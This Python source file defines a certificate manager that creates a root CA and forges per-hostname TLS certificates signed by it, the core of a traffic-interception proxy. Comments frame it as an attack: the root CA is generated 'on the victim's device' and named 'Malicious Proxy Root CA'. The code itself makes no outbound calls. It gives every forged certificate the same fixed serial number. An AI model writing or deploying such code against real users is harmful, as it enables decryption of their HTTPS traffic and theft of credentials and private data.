import os
from OpenSSL import crypto

class CertManager:
    def __init__(self, ca_cert_path='ca.crt', ca_key_path='ca.key'):
        self.ca_cert_path = ca_cert_path
        self.ca_key_path = ca_key_path
        self.certs_dir = 'certs/'
        self.ca_cert = None
        self.ca_key = None
        
        if not os.path.exists(self.certs_dir):
            os.makedirs(self.certs_dir)

    def _load_ca_material(self):
        if self.ca_cert is not None and self.ca_key is not None:
            return

        if not os.path.exists(self.ca_cert_path) or not os.path.exists(self.ca_key_path):
            raise FileNotFoundError('CA certificate or key is missing. Run generate_ca() first.')

        with open(self.ca_cert_path, 'rb') as cert_file:
            self.ca_cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_file.read())

        with open(self.ca_key_path, 'rb') as key_file:
            self.ca_key = crypto.load_privatekey(crypto.FILETYPE_PEM, key_file.read())

    # Generate the Root CA on the victim's device
    def generate_ca(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 2048)
        
        cert = crypto.X509()
        cert.set_version(2)
        cert.set_serial_number(1000)
        cert.get_subject().CN = "Malicious Proxy Root CA"
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(key)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
        cert.sign(key, 'sha256')

        with open(self.ca_cert_path, "w") as f: # Use "w" for text, not "wb"
            cert_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8').strip()
            f.write(cert_pem)

        with open(self.ca_key_path, "w") as f:
            key_pem = crypto.dump_privatekey(crypto.FILETYPE_PEM, key).decode('utf-8')
            f.write(key_pem)

        self.ca_cert = cert
        self.ca_key = key

    # Generate a certificate for a specific hostname, signed by the CA
    def get_cert(self, hostname):
        cert_path = os.path.join(self.certs_dir, f"{hostname}.crt")
        key_path = os.path.join(self.certs_dir, f"{hostname}.key")

        if os.path.exists(cert_path):
            return cert_path, key_path

        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 2048)

        cert = crypto.X509()
        cert.set_version(2)
        cert.get_subject().CN = hostname 
        cert.set_serial_number(2000)     
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
        self._load_ca_material()
        cert.set_issuer(self.ca_cert.get_subject())
        cert.set_pubkey(key)

        cert.sign(self.ca_key, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))

        return cert_path, key_path